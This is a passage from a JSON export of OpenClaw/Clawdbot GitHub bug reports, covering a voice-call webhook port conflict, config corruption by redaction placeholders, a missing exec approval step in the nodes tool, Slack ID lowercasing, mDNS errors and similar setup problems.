        ]
      }
    },
    {
      "number": 13867,
      "title": "voice-call plugin: EADDRINUSE on webhook port — subprocess architecture prevents two-way calls",
      "body": "## Bug Description\n\nThe `voice-call` plugin starts its own HTTP server (webhook listener) in a **subprocess** rather than within the main Gateway process. This causes `EADDRINUSE` errors when the Gateway attempts to handle incoming Twilio webhooks, because the subprocess binds the port first.\n\n**Result:** One-way outbound calls work, but **two-way conversations fail** — the Gateway cannot receive Twilio status callbacks or gather/stream events.\n\n## Environment\n\n- **OpenClaw:** 2026.2.6-3\n- **voice-call plugin:** 2026.2.9\n- **OS:** macOS 15.3 (arm64)\n- **Node:** v25.5.0\n\n## Steps to Reproduce\n\n1. Configure voice-call plugin with Twilio credentials and `conversationMode: true`\n2. Set webhook port (e.g., 3335) and ngrok tunnel\n3. Call `voice_call` tool with `action: \"initiate_call\"`\n4. Observe: outbound call connects, but status callbacks / gather responses never reach Gateway\n\n## Expected Behavior\n\nWebhook HTTP server should run **inside the Gateway process** (or communicate via IPC), so Twilio callbacks are properly routed to the voice-call plugin handler.\n\n## Actual Behavior\n\n- Plugin spawns a separate subprocess for the webhook server\n- Subprocess binds port 3335\n- Gateway cannot bind same port → EADDRINUSE\n- Two-way conversation flow (TTS responses, user input gathering) breaks\n\n## Attempted Workarounds\n\n1. ✅ Verified ngrok tunnel reaches port 3335\n2. ✅ Verified Twilio sends webhooks correctly  \n3. ❌ Attempted Gateway WebSocket RPC (`voicecall.initiate`) — authentication handshake not documented\n4. ❌ Cannot configure plugin to share Gateway HTTP server\n\n## Suggested Fix\n\nEither:\n- (a) Run the webhook listener inside the Gateway process (shared HTTP server or IPC bridge)\n- (b) Expose a documented RPC/IPC protocol so external webhook servers can forward events to Gateway\n- (c) Add a Gateway-native webhook route that proxies to the plugin\n\n## Logs\n\n```\nError: listen EADDRINUSE: address already in use :::3335\n```\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13867",
      "createdAt": "2026-02-11T04:19:23Z",
      "updatedAt": "2026-02-11T04:19:23Z",
      "author": "malashenia",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13058,
      "title": "[Bug]: Studio GUI overwrites openclaw.json with __OPENCLAW_REDACTED__ placeholders, breaking gateway",
      "body": "# Bug: Studio GUI overwrites openclaw.json with `__OPENCLAW_REDACTED__` placeholders, breaking gateway\n\n## Description\n\nOpening OpenClaw Studio causes it to read `~/.openclaw/openclaw.json`, redact sensitive fields for display, and then **write the redacted values back to disk**. This corrupts the config file and prevents the gateway from starting.\n\n## Affected fields\n\nAll sensitive fields are replaced with the string `\"__OPENCLAW_REDACTED__\"`:\n\n| Field path | Original type | After Studio overwrite |\n|---|---|---|\n| `models.providers.minimax.apiKey` | string (API key) | `\"__OPENCLAW_REDACTED__\"` |\n| `models.providers.moonshot.apiKey` | string (API key) | `\"__OPENCLAW_REDACTED__\"` |\n| `models.providers.minimax.models.0.maxTokens` | **number** (`8192`) | `\"__OPENCLAW_REDACTED__\"` (string!) |\n| `models.providers.moonshot.models.0.maxTokens` | **number** (`8192`) | `\"__OPENCLAW_REDACTED__\"` (string!) |\n| `channels.telegram.botToken` | string (bot token) | `\"__OPENCLAW_REDACTED__\"` |\n| `channels.feishu.appSecret` | string | `\"__OPENCLAW_REDACTED__\"` |\n| `channels.feishu.accounts.main.appSecret` | string | `\"__OPENCLAW_REDACTED__\"` |\n| `agents.defaults.memorySearch.remote.apiKey` | string (API key) | `\"__OPENCLAW_REDACTED__\"` |\n| `skills.entries.nano-banana-pro.apiKey` | string (API key) | `\"__OPENCLAW_REDACTED__\"` |\n| `tools.web.search.apiKey` | string (API key) | `\"__OPENCLAW_REDACTED__\"` |\n\n## Impact\n\n1. **Gateway fails to start** — config validation rejects `maxTokens` as string instead of number:\n   ```\n   Config validation failed:\n   - models.providers.minimax.models.0.maxTokens: Invalid input: expected number, received string\n   - models.providers.moonshot.models.0.maxTokens: Invalid input: expected number, received string\n   ```\n\n2. **Telegram channel dead** — `getMe` returns 404 because botToken is a placeholder string\n\n3. **Feishu channel dead** — `failed to obtain token` because appSecret is a placeholder\n\n4. **All model providers broken** — API keys are placeholder strings\n\n## Steps to Reproduce\n\n1. Have a working OpenClaw CLI setup with configured API keys, bot tokens, etc.\n2. Open OpenClaw Studio GUI\n3. Close Studio (or just let it run)\n4. Check `~/.openclaw/openclaw.json` — all sensitive values are now `\"__OPENCLAW_REDACTED__\"`\n5. Gateway crashes on next restart with config validation errors\n\n## Expected Behavior\n\nStudio should redact values **only in memory/UI display**. When writing config back to disk, it must preserve the original values. Alternatively, Studio should not write to `openclaw.json` at all if it cannot preserve sensitive field values.\n\n## Additional Notes\n\n- The redaction logic doesn't distinguish between data types — it replaces numeric `maxTokens: 8192` with string `\"__OPENCLAW_REDACTED__\"`, causing a type mismatch that fails schema validation.\n- Workaround: restore from backup files (`openclaw.json.bak.*`) and avoid using Studio GUI.\n\n## Environment\n\n- OpenClaw CLI: v2026.2.9\n- OpenClaw Studio: latest (uninstalled after discovering this bug)\n- OS: macOS (Apple Silicon)\n- Node: v22.22.0\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13058",
      "createdAt": "2026-02-10T02:46:44Z",
      "updatedAt": "2026-02-11T04:18:39Z",
      "author": "backtime1993",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882033251,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13058#issuecomment-3882033251",
          "createdAt": "2026-02-11T04:18:38Z",
          "updatedAt": "2026-02-11T04:18:38Z",
          "author": "shuai-clawd",
          "body": "**Same bug triggered by `openclaw doctor` upgrade (not Studio)**\n\nWe hit the same issue today. Our trigger was different — `openclaw doctor` upgrading to 2026.2.9, not Studio GUI — but the symptoms are identical.\n\n**Timeline:**\n- `openclaw doctor` upgraded to 2026.2.9 at 11:39:00\n- 52 seconds later, Telegram API calls started returning 404: `getMe failed`, `setMyCommands failed`, `deleteMyCommands failed`\n- Gateway was running but Telegram channel was dead\n\n**Root cause (same as this issue):**\nThe config file had `__OPENCLAW_REDACTED__` written into `channels.telegram.botToken` after the upgrade. The actual token value was replaced on disk.\n\n**Workaround:**\nManually restored the real bot token via `gateway config.patch`.\n\n**Key difference from OP:**\nThis was triggered by `openclaw doctor`, not Studio GUI — suggesting the redaction-writes-back-to-disk bug exists in the CLI upgrade path as well, not just Studio.\n\n**Environment:**\n- OpenClaw CLI: 2026.2.9 (upgraded from 2026.2.6-3)\n- OS: macOS 15.3 (Apple Silicon)\n- Node: v25.4.0"
        }
      ]
    },
    {
      "number": 4718,
      "title": "[Bug]: HTTP 400: Invalid 'messages[2].tool_calls[0].id': string too long. Expected a string with maximum length 40",
      "body": "Summary\n\nWhat went wrong?\n\nWhen using Clawdbot with the Telegram provider, asking the agent to create a GitLab repository consistently results in an HTTP 400 error:\n\nHTTP 400: Invalid 'messages[2].tool_calls[0].id': string too long.\nExpected a string with maximum length 40, but got a string with length 438 instead.\n\n\nThis happens every time the request triggers a tool call. As a result, the Telegram bot cannot complete the task and does not respond.\n\nSteps to reproduce\n\nInstall and run Clawdbot 2026.1.24-3\n\nConfigure the Telegram provider with a valid bot token\n\nConfigure an agent using model chatgpt-5.2\n\nStart the gateway:\n\nclawdbot gateway\n\n\nSend a message to the Telegram bot, for example:\n\n“Create a new repository on GitLab named test-repo under my account.”\n\nExpected behavior\n\nWhat did you expect to happen?\n\nThe agent should invoke the GitLab-related tool to create a repository\n\ntool_calls should be generated with a valid schema\n\nThe request should succeed or fail gracefully (e.g. authentication error), not with a schema validation error\n\nActual behavior\n\nWhat actually happened?\n\nThe agent attempts to perform a tool call\n\nClawdbot returns an HTTP 400 error from the upstream API:\n\nInvalid 'messages[2].tool_calls[0].id': string too long.\nExpected a string with maximum length 40, but got a string with length 438 instead.\n\n\nThe error occurs consistently whenever this action is requested\n\nNo response is sent back to the Telegram bot\n\nEnvironment\n\nClawdbot version: 2026.1.24-3\n\nOS: Linux (cloud VM, headless)\n\nInstall method (pnpm/npx/docker/etc): Node.js via nvm (Node v22.x), running via systemd\n\nModel: chatgpt-5.2\n\nProvider: Telegram (long polling)\n\nLogs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n\nHTTP 400: Invalid 'messages[2].tool_calls[0].id': string too long.\nExpected a string with maximum length 40, but got a string with length 438 instead.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4718",
      "createdAt": "2026-01-30T15:14:16Z",
      "updatedAt": "2026-02-11T04:13:45Z",
      "author": "cRexxar",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3824376643,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4718#issuecomment-3824376643",
          "createdAt": "2026-01-30T15:42:04Z",
          "updatedAt": "2026-01-30T15:42:04Z",
          "author": "cRexxar",
          "body": "I reset my session.json in .clawdbot/agent/main/sessions/session.json and restart gateway fix, but calwdbot lose memory"
        },
        {
          "id": 3882023144,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4718#issuecomment-3882023144",
          "createdAt": "2026-02-11T04:13:45Z",
          "updatedAt": "2026-02-11T04:13:45Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4725,
      "title": "Agent nodes tool skips exec approval flow for system.run",
      "body": "## Bug\n\nWhen an agent invokes `system.run` via the nodes tool (`createNodesTool` in `src/agents/tools/nodes-tool.ts`), the command is sent directly to the node without going through the exec approval flow. If the node requires approval (`SYSTEM_RUN_DENIED: approval required`), the error propagates unhandled and the command fails.\n\nThe CLI path (`nodes run`) already handles this correctly by requesting approval via `exec.approval.request` and retrying with `approved: true` + `approvalDecision`, but the agent tool path does not.\n\n## Expected behavior\n\nThe nodes tool should:\n\n1. Attempt `node.invoke` with `system.run` without approval flags\n2. If the node responds with `SYSTEM_RUN_DENIED: approval required`, create a pending approval request on the gateway via `exec.approval.request`\n3. Wait for the user to approve/deny via the UI (with a 120s timeout)\n4. If approved, retry `node.invoke` with `approved: true` and the approval decision\n5. If denied or timed out, throw a clear error\n\n## Actual behavior\n\nThe nodes tool sends `system.run` without approval flags and does not catch or handle the `SYSTEM_RUN_DENIED` error, so commands that require approval always fail from agent context.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4725",
      "createdAt": "2026-01-30T15:30:14Z",
      "updatedAt": "2026-02-11T04:13:44Z",
      "author": "rmorse",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3882023064,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4725#issuecomment-3882023064",
          "createdAt": "2026-02-11T04:13:43Z",
          "updatedAt": "2026-02-11T04:13:43Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4751,
      "title": "Slack channel/user IDs incorrectly lowercased in normalizeSlackMessagingTarget()",
      "body": "## Bug Description\n\nThe `normalizeSlackMessagingTarget()` function in `src/providers/plugins/normalize-target.ts` lowercases all Slack IDs (channels, users, groups). Slack IDs are alphanumeric and **case-sensitive** (e.g., `C0ACC8J786L`), so this breaks API calls.\n\n## Reproduction\n\n1. Try to react to a message in a Slack channel using the message tool\n2. Pass a channel ID like `C0ACC8J786L`\n3. The ID gets normalized to `c0acc8j786l`\n4. Slack API returns \"Unknown channel\"\n\n## Root Cause\n\nIn `normalize-target.js`, every return path lowercases the entire string:\n\n```javascript\n// Line 15\nreturn id ? `channel:${id}`.toLowerCase() : undefined;\n// C0ACC8J786L → channel:c0acc8j786l 💥\n```\n\n## Suggested Fix\n\nRemove `.toLowerCase()` from Slack ID handling, or only lowercase the prefix:\n\n```javascript\n// Option 1: Don't lowercase at all (Slack IDs are already canonical)\nreturn id ? `channel:${id}` : undefined;\n\n// Option 2: Only lowercase the prefix for consistency\nreturn id ? `channel:${id}` : undefined;\n```\n\nNote: Discord's numeric IDs are unaffected by case, so this bug only manifests with Slack.\n\n## Environment\n\n- Clawdbot version: (installed via npm)\n- Node: v22.22.0\n- OS: Linux 6.8.0-90-generic (x64)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4751",
      "createdAt": "2026-01-30T16:09:27Z",
      "updatedAt": "2026-02-11T04:13:42Z",
      "author": "switchspan",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "discord",
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3882022983,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4751#issuecomment-3882022983",
          "createdAt": "2026-02-11T04:13:41Z",
          "updatedAt": "2026-02-11T04:13:41Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4774,
      "title": "[macOS] Bonjour/mDNS announcement fails with EAFNOSUPPORT on loopback and en0 interfaces",
      "body": "# [macOS] Bonjour/mDNS announcement fails with EAFNOSUPPORT on loopback and en0 interfaces\n\n## Bug Report\n\n### Environment\n- **OpenClaw Version**: 2026.1.29\n- **OS**: macOS 15.x (arm64)\n- **Node.js**: v24.13.0\n- **Install Method**: npm/installer\n\n### Bug Description\n\nOpenClaw gateway continuously fails to broadcast Bonjour/mDNS announcements, producing `EAFNOSUPPORT` errors every 1-2 minutes. The error occurs on both `lo0` (loopback) and `en0` (wired/wireless) interfaces.\n\n### Error Logs\n\n```\n[Mac mini (OpenClaw)._openclaw-gw._tcp.local.] Failed to send announcement requests:\n- Failed to send packet on interface lo0: send EAFNOSUPPORT 224.0.0.251:5353\n- Failed to send packet on interface en0: send EAFNOSUPPORT 224.0.0.251:5353 true\n```\n\n```\n2026-01-30T15:07:34.635Z [clawdbot] Unhandled promise rejection: Error: Announcement failed as of socket errors!\n    at /usr/local/lib/node_modules/openclaw/node_modules/@homebridge/ciao/src/responder/Announcer.ts:158:29\n```\n\n### Steps to Reproduce\n\n1. Install OpenClaw with LaunchAgent (default setup)\n2. Start the gateway\n3. Observe `~/.openclaw/logs/gateway.err.log`\n4. Errors repeat every 1-2 minutes\n\n### Expected Behavior\n\n- mDNS broadcast should work on macOS or fail gracefully without spamming logs\n- Configuration option to disable Bonjour should prevent the library from initializing\n\n### Actual Behavior\n\n- EAFNOSUPPORT errors flood logs continuously\n- `CLAWDBOT_DISABLE_BONJOUR=1` environment variable is not respected\n- `discovery.bonjour.enabled: false` config does not prevent errors\n\n### Workarounds Tried\n\n#### 1. Config File\n```json\n\"discovery\": {\n  \"wideArea\": { \"enabled\": false },\n  \"bonjour\": { \"enabled\": false }\n}\n```\n- ❌ Does not prevent errors\n\n#### 2. Environment Variable\n```bash\nCLAWDBOT_DISABLE_BONJOUR=1\n```\n- ❌ Does not prevent errors (may need `OPENCLAW_DISABLE_BONJOUR` instead?)\n\n### Related Issues\n\n- #4279 - Windows Bonjour/ciao causes terminal window flashing (similar root cause: @homebridge/ciao library)\n- #4632 - Gateway crash causes LaunchAgent exponential throttling (related to error handling)\n\n### Root Cause\n\nThe `@homebridge/ciao` library attempts to broadcast to mDNS multicast address `224.0.0.251:5353` using a method that produces `EAFNOSUPPORT` on macOS. This appears to be a compatibility issue between:\n\n- Node.js version (v24.13.0+ on arm64)\n- macOS network stack changes\n- The ciao library's socket initialization\n\n### Suggested Fixes\n\n#### Option 1: Graceful Error Handling\nCatch and suppress `EAFNOSUPPORT` errors in the mDNS announcement layer, log only once on startup.\n\n#### Option 2: Complete Disable Support\nEnsure `CLAWDBOT_DISABLE_BONJOUR` (and potentially `OPENCLAW_DISABLE_BONJOUR`) fully prevents the ciao library from initializing.\n\n#### Option 3: Fallback Network Interface Detection\nSkip interfaces that don't support multicast (EAFNOSUPPORT) instead of failing all announcements.\n\n#### Option 4: Update/Replace @homebridge/ciao\nConsider updating to a newer version of ciao that handles macOS network quirks, or implement mDNS directly.\n\n### Additional Context\n\n- Error persists across OpenClaw v2026.1.24-3 → v2026.1.29\n- Service name changed: `Clawdbot` → `OpenClaw`\n- Config path changed: `~/.clawdbot/` → `~/.openclaw/`\n- The @homebridge/ciao library is designed for HomeBridge but may have assumptions about network behavior that don't align with OpenClaw's use case\n\n---\n\n**Labels**: `bug`, `macOS`, `mDNS`, `priority: medium`\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4774",
      "createdAt": "2026-01-30T17:07:51Z",
      "updatedAt": "2026-02-11T04:13:40Z",
      "author": "KayIter",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "windows"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882022922,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4774#issuecomment-3882022922",
          "createdAt": "2026-02-11T04:13:40Z",
          "updatedAt": "2026-02-11T04:13:40Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4789,
      "title": "Windows: clawdbot webhooks gmail setup reports 'gog not installed' despite gog being in PATH",
      "body": "## Environment\n- **OS:** Windows 11 (10.0.26200)\n- **Clawdbot:** 2026.1.24-3\n- **gog:** v0.9.0 (99d9575 2026-01-22)\n- **Node:** v24.13.0\n\n## Problem\n`clawdbot webhooks gmail setup --account <email>` fails with:\n```\nError: gog not installed; install it and retry\n```\n\nHowever, gog is installed and works correctly from the same shell:\n```powershell\nPS> gog --version\nv0.9.0 (99d9575 2026-01-22T04:15:12Z)\n\nPS> where.exe gog\nC:\\Windows\\System32\\gog.exe\nC:\\Users\\NickLopez\\dev\\tools\\gogcli\\gog.exe\n```\n\n## Investigation\n1. `gog --version` works fine from PowerShell\n2. `gog.exe` exists in `C:\\Windows\\System32` (and a second copy elsewhere)\n3. The wizard's gog detection still fails\n4. Tried `tools.exec.pathPrepend` but discovered a separate bug (see below)\n\n## Related Bug: tools.exec.pathPrepend replaces PATH instead of prepending\n\nWhen setting:\n```json\n{tools:{exec:{pathPrepend:[C:\\\\Windows\\\\System32,C:\\\\Users\\\\NickLopez\\\\dev\\\\tools\\\\gogcli]}}}\n```\n\nThe exec environment's PATH becomes *only* those two directories, instead of prepending to the existing PATH:\n```powershell\nPS> $env:PATH\nC:\\Windows\\System32;C:\\Users\\NickLopez\\dev\\tools\\gogcli\n```\n\nThis breaks other tools (including `clawdbot` itself) since the rest of PATH is gone.\n\n## Expected Behavior\n1. `clawdbot webhooks gmail setup` should detect gog when it's in PATH on Windows\n2. `tools.exec.pathPrepend` should prepend to PATH, not replace it\n\n## Workaround\nNone found for the gog detection issue. Manual setup per docs works but requires more steps.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4789",
      "createdAt": "2026-01-30T17:36:45Z",
      "updatedAt": "2026-02-11T04:13:38Z",
      "author": "FenrirIsFree",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882022850,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4789#issuecomment-3882022850",
          "createdAt": "2026-02-11T04:13:38Z",
          "updatedAt": "2026-02-11T04:13:38Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4807,
      "title": "Sandbox setup script missing from npm package (sandbox-setup.sh)",
      "body": "## Description\n\nWhen running `openclaw doctor` or the onboarding wizard, if the sandbox Docker image `openclaw-sandbox:bookworm-slim` is missing, the user is prompted to build it. Accepting the prompt fails with:\n\n```\nUnable to locate scripts/sandbox-setup.sh. Run it from the repo root.\n```\n\nThe file `scripts/sandbox-setup.sh` only exists in the source repo and is not included in the npm package. The npm install only ships `scripts/format-staged.js`, `scripts/postinstall.js`, and `scripts/setup-git-hooks.js`.\n\nLooking at the source, the sandbox image is just `debian:bookworm-slim` tagged as `openclaw-sandbox:bookworm-slim`. The fix could be:\n\n1. Bundle `sandbox-setup.sh` in the npm package, or\n2. Inline the `docker pull` + `docker tag` logic directly in the doctor/wizard flow instead of shelling out to a missing script\n\n## Steps to Reproduce\n\n1. Install openclaw via npm (`npm install -g openclaw`)\n2. Have Docker running but no `openclaw-sandbox:bookworm-slim` image\n3. Run the setup wizard or `openclaw doctor`\n4. Accept the prompt to build the sandbox image\n5. Observe the error about missing script\n\n## Workaround\n\n```bash\ndocker pull debian:bookworm-slim\ndocker tag debian:bookworm-slim openclaw-sandbox:bookworm-slim\n```\n\n## Expected Behavior\n\nThe wizard/doctor should be able to build the sandbox image without requiring files only present in the git repo.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4807",
      "createdAt": "2026-01-30T18:05:16Z",
      "updatedAt": "2026-02-11T04:13:37Z",
      "author": "TheSethRose",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "onboarding"
        ]
      },
      "commentsData": [
        {
          "id": 3882022780,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4807#issuecomment-3882022780",
          "createdAt": "2026-02-11T04:13:36Z",
          "updatedAt": "2026-02-11T04:13:36Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4812,
      "title": "[Bug]: open claw zalo personal accout error npm download",
      "body": "## Summary\nWhat went wrong?\nreconfigure open claw with zalo npm\n## Steps to reproduce\n1.  openclaw configure\n2. choose local gateway\n3. select config Channels\n4. pick  Zalo Personal: install plugin to enable\n5. error happen when Download from npm\n## Expected behavior\nWhat did you expect to happen?\ndownloaded package and configured like i configured discord and whatapp work\n\n## Actual behavior\nWhat actually happened?\n\n<img width=\"743\" height=\"951\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a289f23f-c558-4af7-860d-bcc6a59c44a2\" />\nshow errr like\nDownloading @openclaw/zalouser…\nError: spawn npm ENOENT\n\n- same problem with zalo  (bot api)\nInstall Zalo plugin?\n│  Download from npm (@openclaw/zalo)\nDownloading @openclaw/zalo…\n\n## Environment\n- Clawdbot version: 2026.1.29\n- OS: window 11\n-  npm: 10.9.2\n- node: v22.15.0\n- Install method (pnpm/npx/docker/etc): OpenClaw install script\n\n## Logs or screenshots\nPaste relevant logs or add screenshots (redact secrets).\n\n<img width=\"938\" height=\"959\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/0b84a8c4-e7f6-4779-ad27-94366a66833e\" />\n\n<img width=\"1232\" height=\"996\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/e19d06c6-b4eb-4c1d-a4a9-2f07b35bece0\" />\n\n<img width=\"1228\" height=\"1001\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/319f7c9b-c44a-4142-b416-cabff806bb2a\" />",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4812",
      "createdAt": "2026-01-30T18:13:42Z",
      "updatedAt": "2026-02-11T04:13:35Z",
      "author": "huyprowow",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882022718,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4812#issuecomment-3882022718",
          "createdAt": "2026-02-11T04:13:35Z",
          "updatedAt": "2026-02-11T04:13:35Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4820,
      "title": "voice-call plugin: Streaming returns 404, non-streaming ignores Gather callbacks",
      "body": "# voice-call plugin: Streaming returns 404, non-streaming ignores Gather callbacks\n\n## Summary\n\nThe voice-call plugin has two related bugs that prevent bidirectional phone conversations:\n\n1. **Streaming mode (`streaming.enabled: true`)**: The webhook returns `<Connect><Stream url=\"wss://.../voice/stream\"/>` TwiML, but the WebSocket endpoint is never created — requests to `/voice/stream` return 404.\n\n2. **Non-streaming mode (`streaming.enabled: false`)**: The webhook ignores `SpeechResult` from Twilio's `<Gather>` callbacks and returns `<Pause length=\"30\"/>` instead of processing the speech and responding.\n\n## Environment\n\n- **OpenClaw version**: 2026.1.29\n- **OS**: macOS (arm64)\n- **Provider**: Twilio\n- **Exposure**: Tailscale Funnel\n\n## Reproduction Steps\n\n### Streaming Mode (default)\n\n1. Configure voice-call plugin with `streaming.enabled: true` (or omit, as it seems to be default)\n2. Initiate a call via `voice_call` tool or CLI\n3. Answer the call\n4. Observe: call connects but no audio because WebSocket fails\n\n```bash\n# Test the stream endpoint\ncurl -I \"https://your-funnel-url/voice/stream\"\n# Returns: HTTP 404\n```\n\n### Non-Streaming Mode\n\n1. Set `streaming.enabled: false` in config\n2. Restart gateway\n3. Initiate a call\n4. Answer and speak after the greeting\n5. Observe: no response, call eventually times out\n\n```bash\n# Simulate what Twilio sends after Gather\ncurl -X POST \"http://127.0.0.1:3335/voice/webhook\" \\\n  -d \"CallSid=CAxxxx\" \\\n  -d \"SpeechResult=Hello this is a test\" \\\n  -d \"Confidence=0.9\" \\\n  -d \"CallStatus=in-progress\"\n\n# Returns: <Response><Pause length=\"30\"/></Response>\n# Expected: <Response><Say>...</Say><Gather>...</Gather></Response>\n```\n\n## Expected Behavior\n\n### Streaming Mode\nThe `/voice/stream` WebSocket endpoint should be created and handle bidirectional audio via Twilio Media Streams.\n\n### Non-Streaming Mode  \nWhen `SpeechResult` is received from a `<Gather>` callback, the plugin should:\n1. Process the transcribed speech\n2. Send it to the agent for a response\n3. Return TwiML with `<Say>` containing the response and another `<Gather>` to continue the conversation\n\n## Workaround\n\nI created a standalone Node.js webhook that handles the Gather flow correctly. It:\n1. Returns `<Gather input=\"speech\">` TwiML on initial call\n2. Receives `SpeechResult` from Twilio  \n3. Returns `<Say>` with a response\n\nThis works perfectly, confirming the issue is in the plugin, not Twilio or the network setup.\n\n## Config Used\n\n```json\n{\n  \"plugins\": {\n    \"entries\": {\n      \"voice-call\": {\n        \"enabled\": true,\n        \"config\": {\n          \"provider\": \"twilio\",\n          \"twilio\": {\n            \"accountSid\": \"ACxxxx\",\n            \"authToken\": \"xxxx\"\n          },\n          \"fromNumber\": \"+1xxx\",\n          \"publicUrl\": \"https://xxx.ts.net/voice/webhook\",\n          \"serve\": {\n            \"port\": 3335,\n            \"bind\": \"127.0.0.1\",\n            \"path\": \"/voice/webhook\"\n          },\n          \"streaming\": {\n            \"enabled\": false,\n            \"streamPath\": \"/voice/stream\"\n          },\n          \"outbound\": {\n            \"defaultMode\": \"conversation\"\n          },\n          \"tts\": {\n            \"provider\": \"openai\",\n            \"openai\": { \"voice\": \"alloy\" }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n## Additional Context\n\n- Outbound `notify` mode works (plays TTS greeting and hangs up)\n- `<Record>` captures audio correctly\n- The issue is specifically with bidirectional conversation flow\n- Tested on 2026-01-30 with extensive debugging\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4820",
      "createdAt": "2026-01-30T18:20:29Z",
      "updatedAt": "2026-02-11T04:13:33Z",
      "author": "base698",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3832784699,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4820#issuecomment-3832784699",
          "createdAt": "2026-02-02T03:59:32Z",
          "updatedAt": "2026-02-02T03:59:32Z",
          "author": "mazamizo21",
          "body": "Please check this out : [openclaw-voicecall-twilio-no-audio-fix.md](https://github.com/user-attachments/files/24999621/openclaw-voicecall-twilio-no-audio-fix.md)"
        },
        {
          "id": 3882022658,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4820#issuecomment-3882022658",
          "createdAt": "2026-02-11T04:13:33Z",
          "updatedAt": "2026-02-11T04:13:33Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4830,
      "title": "WhatsApp groups: requireMention: false config not being applied",
